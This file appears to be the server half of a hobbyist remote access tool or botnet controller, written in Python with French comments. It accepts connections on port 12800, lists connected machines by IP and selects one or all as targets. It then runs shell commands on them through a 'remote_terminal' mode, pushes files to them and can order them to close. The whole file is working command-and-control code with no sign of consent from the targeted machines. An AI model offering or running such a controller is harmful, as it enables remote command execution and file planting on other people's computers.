import socket, select, time

hote = ''
port = 12800

def refresh_user(main_connexion):
    clients_connectes = []
    connexions_demandees, wlist, xlist = select.select([main_connexion],
        [], [], 0.05)

    for connexion in connexions_demandees:
        connexion_avec_client, infos_connexion = connexion.accept()
        clients_connectes.append(connexion_avec_client)
    
    return clients_connectes

def set_server():
    return "server", [], "void"


connexion_principale = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connexion_principale.bind((hote, port))
connexion_principale.listen(5)
print("Le serveur écoute à présent sur le port {}".format(port))


targets = []
target, targets, target_job = set_server()
clients_connectes = refresh_user(connexion_principale)

while True:

    try:
        server_input = input(target+"@"+target_job+"# ")
    except KeyboardInterrupt:
        if target_job == "void":
            server_input = "close_server_client"
        if target_job == "remote_terminal":
            server_input = "close_remote_terminal"
    server_action = server_input.split(" ")

    if target_job == "void":
        if server_action[0] == "refresh":
            # Actualise la liste d'utilisateur connecte en virant ceux qui repondent pas à un "ping"
            to_kick = []
            nouveau_clients = refresh_user(connexion_principale)
            clients_connectes += nouveau_clients
            if clients_connectes:
                for i in range(len(clients_connectes)):
                    try:
                        clients_connectes[i].send(b'tlakoya')
                        jsuislakoya = clients_connectes[i].recv(1024)
                    except ConnectionResetError:
                        jsuislakoya = b""
                    except ConnectionAbortedError:
                        jsuislakoya = b""

                    if jsuislakoya.decode() == "":
                        to_kick.append(i)
                    else:
                        print(clients_connectes[i].getpeername()[0]+"\n")
            else:
                print("personne est connecte\n")

            # kick les utilisateurs (ouai ils sont dans une liste mdr)
            for i in to_kick:
                clients_connectes.pop(i)

        # focus sur un client en particulier
        elif server_action[0] == "target":
            is_client = False
            if len(server_action) > 1:
                if server_action[1] == "server":
                    target, targets, target_job = set_server()

                    is_client = True
                elif server_action[1] == "all":
                    target = "all"
                    if clients_connectes:
                        for i in range(len(clients_connectes)):
                            targets.append(clients_connectes[i])
                            target_job = "void"
                            is_client = True
                elif server_action[1] != "":
                    if clients_connectes:
                        for i in range(len(clients_connectes)):
                            if server_action[1] == clients_connectes[i].getpeername()[0]:
                                target = server_action[1]
                                targets = [clients_connectes[i]]
                                target_job = "void"

                                is_client = True
                if is_client == False:
                    print("Le client",server_action[1],"est introuvable\n")
            else:
                print("vous n'avez pas entrez d'adresse\n")

        # envoies un message aux clients (c'est plus pour l'experimentation et la phase "beta")
        elif server_action[0] == "send":
            for target_socket in targets:
                if target_socket is not None:
                    target_socket.send(" ".join(server_action).encode())
                    verification = target_socket.recv(1024)
                    if verification.decode() == "":
                        print("le client est deco\n")
                        target, targets, target_job = set_server()
                else:
                    print("target none\n")

        elif server_action[0] == "remote_terminal":
            target_job = "remote_terminal"
            for target_socket in targets:
                target_socket.send(b"remote_terminal")

        elif server_action[0] == "close_server_client":
            for iencli in clients_connectes:
                iencli.send(b"close_server_client")
            break

    elif target_job == "remote_terminal":
        try:
            # focus sur le terminal d'une adresse en particulier
            if server_action[0] == "close_remote_terminal":
                target_job = "void"
                for target_socket in targets:
                    target_socket.send(b"close_remote_terminal")

            elif server_action[0] == "download_from_server":
                if len(server_action) > 1:
                    try:
                        le_fichier = open(server_action[1],"rb")
                        le_fichier_size = len(le_fichier.read())
                        for target_socket in targets:
                            target_socket.send(server_action[0].encode()+b" "+str(le_fichier_size).encode()+b" "+server_action[1].encode())

                        le_fichier.seek(0)
                        le_fichier_bytes = le_fichier.read(le_fichier_size)
                        target_socket.send(le_fichier_bytes)
                        print(target_socket.recv(100).decode()+"\n")

                    except FileNotFoundError:
                        print("Le fichier n'existe pas\n")
                else:
                    print("vous n'avez tapez aucun nom de fichier\n")
            else:
                if server_input == "":
                    server_input = " "
                commande = server_input.encode()
                for target_socket in targets:
                    target_socket.send(commande)
                    reponse = str(target_socket.recv(20000).decode("utf-8", errors="ignore"))
                    if reponse == "":
                        print("le client est deco\n")
                        target, targets, target_job = set_server()
                    else:
                        print(reponse)
        except ConnectionResetError:
            print("le client a deco\n")
            target, targets, target_job = set_server()
